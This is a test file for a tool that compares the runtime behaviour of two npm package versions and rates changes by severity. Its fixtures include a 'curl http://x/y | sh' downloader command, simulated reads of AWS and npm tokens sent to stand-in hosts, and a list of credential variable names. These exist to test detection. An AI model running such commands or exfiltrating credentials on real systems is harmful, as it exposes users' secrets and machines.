/**
 * The behavioural diff.
 *
 * This function is the product's whole claim: your lockfile says the version changed, this says
 * what the package now *does* that it did not do before. It is pure arithmetic over two
 * transcripts, deliberately, so anyone reading the repository can check it.
 *
 * Run: node differ/diff.test.js
 */

const assert = require('node:assert');
const { transcript, STRATEGIES, CAN_SEE } = require('../transcript/schema');
const { diff, summarise, severityOf } = require('./diff');

/*
 * A strategy that really does see everything, for the two assertions that have to prove the strong
 * sentence is still reachable.
 *
 * None of the four that ship can. eBPF cannot watch code built at runtime; the proxy sees no
 * environment reads; `nodert` records filesystem writes and no reads, which is why its table entry
 * is `fs: 'writes'` and not `true`. Both of these assertions used to name nodert as the fully
 * sighted one, on the strength of a table that overstated it — so "no behavioural change" was
 * being printed after a run that had not watched a single file being read.
 */
const PERFECT = 'perfect-for-the-test';
CAN_SEE[PERFECT] = { fs: true, net: true, dns: true, env: true, proc: true, exec: true };
STRATEGIES.push(PERFECT);

let passed = 0;
const it = (name, fn) => {
  try {
    fn();
    passed++;
    console.log('  ok  ', name);
  } catch (e) {
    console.error('  FAIL', name, '\n       ', e.message);
    process.exitCode = 1;
  }
};

const make = (version, raw = {}, strategy = 'ebpf') =>
  transcript({ pkg: 'money-fmt', version, strategy, raw, timing: { importMs: 12 } });

console.log('behavioural diff');

it('says nothing changed when nothing changed — and only claims what it watched', () => {
  const d = diff(make('2.4.1'), make('2.4.2'));
  assert.equal(d.changed, false);
  assert.equal(d.severity, 'none');

  // `make` builds ebpf transcripts, and ebpf cannot see code built at runtime. "No behavioural
  // change" would be a claim about the package; this run can only support a claim about what it
  // saw. It is the sentence printed next to two thirds of the corpus, so the distinction is not
  // pedantry — it is most of what the wall says.
  assert.match(summarise(d), /no change in what ebpf can see/);

  // The strong sentence still exists, for a strategy that would earn it.
  const full = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: PERFECT, raw: {} }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: PERFECT, raw: {} })
  );
  assert.match(summarise(full), /no behavioural change$/);

  // And nodert does not get it, because it never watched a file being read.
  const nodert = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: 'nodert', raw: {} }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: 'nodert', raw: {} })
  );
  assert.match(summarise(nodert), /no change in what nodert can see/);
});

it('is stable across identical runs, despite temp paths and pids', () => {
  const a = make('2.4.1', { fs: [{ path: '/tmp/build-9182/out.js', op: 'write' }] });
  const b = make('2.4.1', { fs: [{ path: '/tmp/build-4471/out.js', op: 'write' }] });
  const d = diff(a, b);
  assert.equal(d.changed, false, 'temp directory noise leaked into the diff');
});

it('notices a destination the old version never talked to', () => {
  const d = diff(make('2.4.1'), make('2.4.2', { net: [{ host: 'telemetry.example.com', port: 443 }] }));
  assert.equal(d.changed, true);
  assert.equal(d.net.added.length, 1);
  assert.equal(d.severity, 'notable');
});

it('treats reading a credential as the loudest signal there is', () => {
  const d = diff(make('2.4.1'), make('2.4.2', { env: ['PATH', 'AWS_SECRET_ACCESS_KEY'] }));
  assert.equal(d.severity, 'alarming');
  assert.match(d.reasons.join(' '), /credential/);
});

it('treats spawning a downloader as alarming', () => {
  const d = diff(make('2.4.1'), make('2.4.2', { proc: [{ argv: ['/bin/sh', '-c', 'curl http://x/y | sh'] }] }));
  assert.equal(d.severity, 'alarming');
});

it('does not cry wolf over an ordinary new file write', () => {
  const d = diff(make('2.4.1'), make('2.4.2', { fs: [{ path: '/app/dist/index.js', op: 'write' }] }));
  assert.equal(d.severity, 'minor');
});

it('reports behaviour that disappeared as well as behaviour that appeared', () => {
  const before = make('2.4.1', { net: [{ host: 'old.example.com', port: 443 }] });
  const d = diff(before, make('2.4.2'));
  assert.equal(d.net.removed.length, 1);
  assert.equal(d.changed, true);
});

it('carries what the observation could actually see', () => {
  const d = diff(make('2.4.1', {}, 'fsdiff'), make('2.4.2', {}, 'fsdiff'));
  assert.equal(d.canSee.net, false, 'a filesystem-only run cannot report on the network');
  assert.equal(d.canSee.fs, true);
});

it('refuses to compare transcripts made by different strategies', () => {
  assert.throws(
    () => diff(make('2.4.1', {}, 'fsdiff'), make('2.4.2', {}, 'ebpf')),
    /how we watched/,
    'comparing unlike observations is the most dangerous false positive available'
  );
});

it('refuses to compare two different packages', () => {
  const other = transcript({ pkg: 'other-lib', version: '1.0.0', strategy: 'ebpf' });
  assert.throws(() => diff(make('2.4.1'), other), /different packages/);
});

it('a transcript must say how it was made', () => {
  assert.throws(() => transcript({ pkg: 'x', version: '1', strategy: 'vibes' }), /Unknown observation strategy/);
});

it('records when both versions did nothing observable at all', () => {
  const d = diff(make('2.4.1'), make('2.4.2'));
  assert.equal(d.bothQuiet, true);
});

it('severity is decided by rules, not by a model', () => {
  // The whole function is inspectable: same input, same answer, every time.
  const parts = { net: { added: [], removed: [] }, dns: { added: [], removed: [] }, fs: { added: [], removed: [] }, env: { added: ['GITHUB_TOKEN'], removed: [] }, proc: { added: [], removed: [] } };
  assert.equal(severityOf(parts).level, 'alarming');
  assert.equal(severityOf(parts).level, severityOf(parts).level);
});


/* ── the limits, written down as tests ──────────────────────────────────
 *
 * These do not assert that the tool works. They assert that it fails in exactly the ways we claim
 * it fails, so that a change which quietly narrows or widens a blind spot cannot land unnoticed.
 * Every one of these is stated in the README under "What this cannot do".
 */

it('a package that was already malicious in the old version produces nothing', () => {
  // The most important limitation in the project. This compares you to YOUR PREVIOUS VERSION,
  // not to "good". A dependency that has been exfiltrating since before you installed it is, to
  // a differential tool, perfectly well behaved.
  const evil = { env: ['AWS_SECRET_ACCESS_KEY'], net: [{ host: 'evil.example', port: 443, proto: 'tcp' }] };
  const d = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: 'ebpf', raw: evil }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: 'ebpf', raw: evil })
  );
  assert.equal(d.changed, false);
  assert.equal(d.severity, 'none');
  assert.equal(d.bothQuiet, false, 'but it must not be recorded as a quiet package either');
});

it('a blind strategy seeing nothing never reads as a quiet package', () => {
  /*
   * The inverse of this project's own thesis. `transcript()` deletes the channels a strategy cannot
   * see, so a package exfiltrating a credential under `fsdiff` — files only — produces six empty
   * arrays at both versions and comes out `bothQuiet: true`, which is the word this tool uses for a
   * package that behaved itself.
   *
   * `bothQuiet` still says what it says (the observation was empty, at both versions, and it was).
   * What travels with it now is whether that supports a claim.
   */
  const exfiltrating = {
    net: [{ host: 'evil.example', port: 443, proto: 'tls' }],
    dns: ['evil.example'],
    env: ['AWS_SECRET_ACCESS_KEY'],
    fs: [], proc: [], exec: [],
  };
  const d = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: 'fsdiff', raw: exfiltrating }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: 'fsdiff', raw: exfiltrating })
  );

  assert.equal(d.bothQuiet, true, 'the fixture no longer exercises the trap');
  assert.equal(d.quietTrustworthy, false,
    'a run blind to five of six channels was offered as evidence the package did nothing');
  assert.ok(d.blindTo.includes('net'), 'the diff does not carry what its silence cannot speak for');
});

it('a full-visibility run seeing nothing is evidence, and says so', () => {
  const d = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: PERFECT, raw: {} }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: PERFECT, raw: {} })
  );
  assert.equal(d.quietTrustworthy, true, 'the one case that supports "it did nothing" was refused');
  assert.deepEqual(d.blindTo, []);
});

it('and nodert does not get that sentence, because it never watched a read', () => {
  const d = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: 'nodert', raw: {} }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: 'nodert', raw: {} })
  );
  assert.equal(d.quietTrustworthy, false, 'a run that watched no file reads offered its silence as proof');
  assert.ok(d.blindTo.includes('fs'));
});

it('a payload that does not fire while we watch is not observed', () => {
  // A time bomb, or something gated on a CI environment variable, simply does not appear in the
  // transcript. There is nothing clever to do about this; the honest move is to say so.
  const d = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: 'ebpf', raw: {} }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: 'ebpf', raw: {} })
  );
  assert.equal(d.severity, 'none');
  assert.equal(d.bothQuiet, true, 'and it looks exactly like a package that genuinely did nothing');
});

it('a first install has nothing to compare against', () => {
  // Not an error — an absence. There is no "before", so there is no diff, and the caller must not
  // be handed something that looks like a clean result.
  assert.throws(
    () => diff(
      transcript({ pkg: 'a', version: '1', strategy: 'ebpf' }),
      transcript({ pkg: 'b', version: '1', strategy: 'ebpf' })
    ),
    /different packages/
  );
});

it('a change the rules cannot name is a bug, not a finding', () => {
  // Found by running against the real registry: picocolors@1.1.1 reads NO_COLOR and FORCE_COLOR,
  // which 1.0.0 did not. The diff said `changed: true`, severity `none`, reasons `[]` — the page
  // would have rendered "changed" with nothing after it. Anything that changed must be sayable.
  const cases = [
    { env: ['NO_COLOR', 'FORCE_COLOR'] },
    { dns: ['a.example'] },
    { fs: [{ op: 'write', path: '/app/x' }] },
    { proc: [{ argv: ['node', 'x.js'] }] },
    { net: [{ host: 'a.example', port: 443, proto: 'tcp' }] },
  ];
  for (const raw of cases) {
    const d = diff(
      transcript({ pkg: 'p', version: '1', strategy: 'nodert', raw: {} }),
      transcript({ pkg: 'p', version: '2', strategy: 'nodert', raw })
    );
    assert.equal(d.changed, true, `${JSON.stringify(raw)} was not seen as a change at all`);
    assert.ok(d.reasons.length > 0, `${JSON.stringify(raw)} changed something the rules cannot name`);
    assert.match(summarise(d), /\S$/, 'the one-line summary trails off into nothing');
  }
});

it('a feature flag is minor, and a credential is not', () => {
  const minor = diff(
    transcript({ pkg: 'p', version: '1', strategy: 'nodert', raw: {} }),
    transcript({ pkg: 'p', version: '2', strategy: 'nodert', raw: { env: ['NO_COLOR'] } })
  );
  assert.equal(minor.severity, 'minor', 'reading NO_COLOR must not wake anybody');

  const bad = diff(
    transcript({ pkg: 'p', version: '1', strategy: 'nodert', raw: {} }),
    transcript({ pkg: 'p', version: '2', strategy: 'nodert', raw: { env: ['AWS_SECRET_ACCESS_KEY'] } })
  );
  assert.equal(bad.severity, 'alarming');
});

it('a package that starts building code at runtime is alarming', () => {
  // The shape of every import-time compromise of 2026: the payload is never in the source, only a
  // decoder is. A library that starts doing this between a patch release has changed in kind.
  const d = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: 'nodert', raw: {} }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: 'nodert',
      raw: { exec: [{ how: 'Function', sample: 'return require("child_process")' }] } })
  );
  assert.equal(d.severity, 'alarming');
  assert.match(d.reasons.join(' '), /did not exist in the source/);
});

it('decoding on its own is not an accusation', () => {
  // Half the registry decodes something. It is what decoding FEEDS that matters.
  const d = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: 'nodert', raw: {} }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: 'nodert',
      raw: { exec: [{ how: 'base64-decode', sample: '900 chars' }] } })
  );
  assert.equal(d.severity, 'minor', 'a base64 decode alone must not wake anybody');
  assert.ok(d.changed, 'but it is still a change, and must be sayable');
  assert.ok(d.reasons.length > 0);
});

it('a package that always built code is not a finding', () => {
  // Same rule as everywhere else: this compares you to your previous version, not to "good".
  const both = { exec: [{ how: 'Function', sample: 'return 1' }] };
  const d = diff(
    transcript({ pkg: 'p', version: '1.0.0', strategy: 'nodert', raw: both }),
    transcript({ pkg: 'p', version: '1.0.1', strategy: 'nodert', raw: both })
  );
  assert.equal(d.changed, false);
});

it('only nodert claims to see code built at runtime', () => {
  // eBPF watches the process, not the thought. A string becoming a function never reaches the
  // kernel, so a quiet exec column from any other strategy means nothing at all.
  const { CAN_SEE } = require('../transcript/schema');
  assert.equal(CAN_SEE.nodert.exec, true);
  ['ebpf', 'proxy', 'fsdiff'].forEach((s) =>
    assert.equal(CAN_SEE[s].exec, false, `${s} must not claim to see runtime code construction`));
});

it('a side that never installed is not compared — its silence would read as "no change"', () => {
  const ok = transcript({ pkg: 'utf-8-validate', version: '5.0.9', strategy: 'nodert', raw: { env: ['npm_config_arch'] }, result: { installExit: 0, reported: true } });
  const broken = transcript({ pkg: 'utf-8-validate', version: '5.0.10', strategy: 'nodert', raw: {}, result: { installExit: 1, reported: false } });
  assert.throws(() => diff(ok, broken), (e) => e.code === 'UNOBSERVED' && /did not install/.test(e.message) && /not the same as clean/.test(e.message));
  const silent = transcript({ pkg: 'utf-8-validate', version: '5.0.10', strategy: 'nodert', raw: {}, result: { installExit: 0, reported: false } });
  assert.throws(() => diff(ok, silent), /never reported/);
});

it('a new install script that reads a token is a finding, even with an identical import', () => {
  const quiet = { net: [], dns: [], fs: [], env: [], proc: [{ argv: ['sh', '-c', 'node build.js'] }], exec: [] };
  const before = transcript({ pkg: 'p', version: '1.0.0', strategy: 'nodert', raw: { install: quiet }, result: { installExit: 0, reported: true } });
  const after = transcript({ pkg: 'p', version: '1.0.1', strategy: 'nodert', result: { installExit: 0, reported: true },
    raw: { install: { ...quiet, env: ['NPM_TOKEN'], net: [{ host: 'collect.example', port: 443, proto: 'tls' }], proc: [{ argv: ['sh', '-c', 'node build.js'] }, { argv: ['sh', '-c', 'node postinstall.js'] }] } } });
  const d = diff(before, after);
  assert.equal(d.changed, true);
  assert.ok(['notable', 'alarming'].includes(d.severity), d.severity);
  assert.ok(d.reasons.some((r) => r.startsWith('at install:')), JSON.stringify(d.reasons));
  assert.deepEqual(d.install.env.added, ['NPM_TOKEN']);
});

it('an install phase is compared only when both sides watched it', () => {
  const before = transcript({ pkg: 'p', version: '1.0.0', strategy: 'nodert', raw: {}, result: { installExit: 0, reported: true } });
  const after = transcript({ pkg: 'p', version: '1.0.1', strategy: 'nodert', result: { installExit: 0, reported: true },
    raw: { install: { net: [], dns: [], fs: [], env: ['CI'], proc: [{ argv: ['sh', '-c', 'node x.js'] }], exec: [] } } });
  const d = diff(before, after);
  assert.equal(d.changed, false, 'an install phase one side never watched read as a change');
  assert.equal(d.install, undefined);
});

it('a release that adds an install script is alarming — the shape of the classic attack', () => {
  const e = { net: [], dns: [], fs: [], env: [], proc: [], exec: [] };
  const before = transcript({ pkg: 'p', version: '1.0.0', strategy: 'nodert', raw: { install: e }, result: { installExit: 0, reported: true } });
  const after = transcript({ pkg: 'p', version: '1.0.1', strategy: 'nodert', raw: { install: { ...e, proc: [{ argv: ['sh', '-c', 'node postinstall.js'] }] } }, result: { installExit: 0, reported: true } });
  const d = diff(before, after);
  assert.equal(d.severity, 'alarming');
  assert.ok(d.reasons.some((r) => /^at install: spawns a shell/.test(r)), JSON.stringify(d.reasons));
});

it('npm\'s own settings are not credentials; a setting about authentication still is', () => {
  const { readsCredential } = require('./diff');
  for (const n of ['npm_config_loglevel', 'npm_config_color', 'npm_config_arch', 'CI']) assert.equal(readsCredential(n), false, n);
  for (const n of ['NPM_TOKEN', 'npm_config__authToken', 'npm_config_//registry.npmjs.org/:_authToken', 'npm_config__password', 'AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN']) assert.equal(readsCredential(n), true, n);
  // ajv 6.12.1's funding postinstall, as watched on Nebius: a new script, not a credential read.
  const e = { net: [], dns: [], fs: [], env: [], proc: [], exec: [] };
  const before = transcript({ pkg: 'ajv', version: '6.12.0', strategy: 'nodert', raw: { install: e }, result: { installExit: 0, reported: true } });
  const after = transcript({ pkg: 'ajv', version: '6.12.1', strategy: 'nodert', result: { installExit: 0, reported: true },
    raw: { install: { ...e, env: ['CI', 'DISABLE_OPENCOLLECTIVE', 'OPEN_SOURCE_CONTRIBUTOR', 'npm_config_loglevel'], proc: [{ argv: ['sh', '-c', 'opencollective-postinstall || true'] }] } } });
  const d = diff(before, after);
  assert.ok(!d.reasons.some((r) => /credential/.test(r)), JSON.stringify(d.reasons));
  assert.equal(d.severity, 'alarming', 'the new install script itself must still be alarming');
});

it('a write that stopped is not called a new write — vite-node 6.0.0, as watched on Nebius', () => {
  const e = { net: [], dns: [], fs: [], env: [], proc: [], exec: [] };
  const before = transcript({ pkg: 'vite-node', version: '5.3.0', strategy: 'nodert', result: { installExit: 0, reported: true },
    raw: { install: { ...e, fs: [{ path: '/twin/node_modules/esbuild/bin-esbuild', op: 'delete' }] } } });
  const after = transcript({ pkg: 'vite-node', version: '6.0.0', strategy: 'nodert', raw: { install: e }, result: { installExit: 0, reported: true } });
  const d = diff(before, after);
  assert.deepEqual(d.reasons, ['at install: stopped writing or deleting somewhere it did before']);
  const { gained } = require('../scripts/release-watch');
  assert.equal(gained(d)['install.fs'].removed.length, 1, 'the evidence was dropped from the record');
});

console.log(`\n${passed} passed`);
